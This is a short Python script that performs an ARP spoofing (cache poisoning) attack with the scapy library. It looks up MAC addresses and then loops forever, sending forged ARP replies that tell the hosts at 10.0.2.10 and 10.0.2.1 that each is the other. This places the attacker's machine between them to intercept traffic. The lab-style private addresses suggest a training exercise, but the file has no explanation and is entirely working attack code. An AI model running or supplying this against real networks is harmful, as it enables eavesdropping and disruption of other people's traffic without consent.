#! /usr/bin/env python3

import scapy.all as scapy
import time


def get_mac(ip):
#return MAC by IP
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # get only 1-st (one PC only) answer -[0], only response - [1], only MAC - hwsrc
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # packet = scapy.ARP(op=2, pdst='10.0.2.7', hwdst='00:00:00:00:00:00', psrc='10.0.2.1')
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)

# get_mac('192.168.56.100')

sent_packets_count = 0
while True:
    spoof('10.0.2.10', '10.0.2.1')
    spoof('10.0.2.1', '10.0.2.10')
    sent_packets_count += 2
    print('[+] Packets sent: ' + str(sent_packets_count))
    time.sleep(2)


################################
# while True:
#     packet = scapy.ARP(op=2, pdst='10.0.2.10', hwdst='08:00:27:3a:86:03', psrc='10.0.2.1')
#     scapy.send(packet)
#     print(packet.show())
#     print(packet.summary())
#     time.sleep(2)
#     print('slipping.........')